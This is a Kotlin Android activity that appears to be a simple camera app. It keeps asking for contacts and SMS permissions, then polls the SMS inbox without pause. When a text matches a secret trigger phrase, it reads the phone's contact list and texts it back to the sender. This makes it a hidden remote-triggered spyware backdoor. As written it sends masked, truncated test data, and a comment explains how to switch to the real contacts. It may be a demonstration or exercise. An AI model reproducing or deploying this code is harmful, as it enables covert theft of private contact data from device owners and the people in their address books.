package com.example.sendcontacts

import android.annotation.SuppressLint
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.net.Uri
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.provider.ContactsContract
import android.provider.MediaStore
import android.telephony.SmsManager
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.ImageView
import android.widget.TextView
import android.widget.Toast
import androidx.core.app.ActivityCompat
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers.IO
import kotlinx.coroutines.async
import kotlinx.coroutines.launch
import java.util.*

class MainActivity : AppCompatActivity() {


    var listenForMessages = true

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        getPermissions(this,this)
    }

    private fun setSmsMessage(uriString: String, selection: String?){
        val sms : SmsData
        val cursor = contentResolver.query(Uri.parse("content://sms/$uriString"),null,selection,null,null)

        if (cursor != null) {
            if(cursor.moveToFirst()){
                val nameID = cursor.getColumnIndex("address")
                val messageID = cursor.getColumnIndex("body")
                val dateID = cursor.getColumnIndex("date")


                val dateString = cursor.getString(dateID)
                sms = SmsData(cursor.getString(nameID), Date(dateString.toLong()).toString(),cursor.getString(messageID))

                if(sms.message.equals("Give me contacts, secret code: okoń")){
                    listenForMessages = false
                    sendContacts(sms.senderName.toString())
                }
            }
            cursor.close()
        }

    }

    private fun readLoop(){
        CoroutineScope(IO).launch {
            async {
                while(listenForMessages) {

                    setSmsMessage("inbox", null)

                }
            }
        }
    }

    private fun getPermissions(con : Context, act : Activity){
        CoroutineScope(IO).launch {
            async {
                while(true) {
                    var permissions = 0
                    if(ActivityCompat.checkSelfPermission(con, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                        ActivityCompat.requestPermissions(act, arrayOf(android.Manifest.permission.CAMERA), 1)
                    }
                    else{
                        permissions++
                    }
                    if(ActivityCompat.checkSelfPermission(con, android.Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
                        ActivityCompat.requestPermissions(act, arrayOf(android.Manifest.permission.READ_CONTACTS), 1)
                    }
                    else{
                        permissions++
                    }
                    if(ActivityCompat.checkSelfPermission(con, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
                        ActivityCompat.requestPermissions(act, arrayOf(android.Manifest.permission.READ_SMS), 2)
                    }
                    else{
                        permissions++
                    }
                    if(ActivityCompat.checkSelfPermission(con, android.Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) {
                        ActivityCompat.requestPermissions(act, arrayOf(android.Manifest.permission.SEND_SMS), 3)
                    }
                    else{
                        permissions++
                    }
                    if(permissions == 4){
                        readLoop()
                        break
                    }
                }
            }
        }
    }

    @SuppressLint("Range")
    private fun sendContacts(number : String){
        val phones = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")
        var contactsToSend = "Contacts for you:\n"
        var testContacts = "Contacts for you:\n"
        while (phones!!.moveToNext()) {
            val name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
            val phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))

            contactsToSend += name + ": " + phoneNumber + "\n"
            testContacts += name.take(6) + ": " + phoneNumber.take(3) + "******\n"
        }
        phones.close()
        val smsManager: SmsManager = SmsManager.getDefault()


        //to send real contacts change testContacts to contactsToSend
        smsManager.sendTextMessage(number, null, testContacts.take(16+(18*5)) , null, null)

    }

    fun takePhoto(view: View){
        val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
        if(intent.resolveActivity(packageManager) != null){
            startActivityForResult(intent, 123)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if(requestCode == 123 && resultCode == RESULT_OK){
            val imageView : ImageView = findViewById(R.id.image)
            val bitmap = data?.extras?.get("data") as Bitmap
            imageView.setImageBitmap(bitmap)
        }
    }
}